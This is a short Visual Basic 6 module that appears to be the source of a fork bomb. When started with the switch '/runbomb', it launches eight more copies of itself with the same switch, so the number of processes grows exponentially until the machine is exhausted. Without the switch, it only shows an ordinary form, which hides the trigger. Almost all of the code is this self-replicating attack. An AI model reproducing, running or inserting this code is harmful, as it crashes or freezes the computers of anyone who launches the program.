Attribute VB_Name = "Module1"
Sub Main()
  Dim strCommandLine As String
    strCommandLine = Command
  If strCommandLine = "/runbomb" Then
    Shell App.EXEName & " /runbomb"
    Shell App.EXEName & " /runbomb"
    Shell App.EXEName & " /runbomb"
    Shell App.EXEName & " /runbomb"
    Shell App.EXEName & " /runbomb"
    Shell App.EXEName & " /runbomb"
    Shell App.EXEName & " /runbomb"
    Shell App.EXEName & " /runbomb"
    Unload All
  Else
    Load Form1
    Form1.Visible = True
  End If
End Sub
